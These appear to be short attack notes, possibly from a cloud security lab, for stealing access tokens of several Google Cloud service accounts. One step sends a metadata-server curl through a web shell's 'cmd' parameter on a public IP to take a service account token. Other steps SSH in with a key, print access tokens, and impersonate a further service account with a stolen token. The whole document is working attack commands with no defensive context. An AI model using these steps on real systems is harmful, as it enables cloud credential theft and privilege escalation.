- Get `gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com` token
```
Visit http://34.42.232.208/?cmd=curl%20-H%20%22Metadata-Flavor:%20Google%22%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com/token
```
- Get `dsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com` token
```
ssh -i .\computessh strukt@35.238.181.166
gcloud auth print-access-token (in the SSH session)
```
- Get `msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com` token
```
gcloud auth print-access-token --impersonate-service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file .\ssh-access-token (token from SSH session)
```
- Get `1027834907986-compute@developer.gserviceaccount.com` token
```
gcloud compute ssh --zone us-central1-b staging-instance-1 --project $p2
gcloud auth print-access-token
```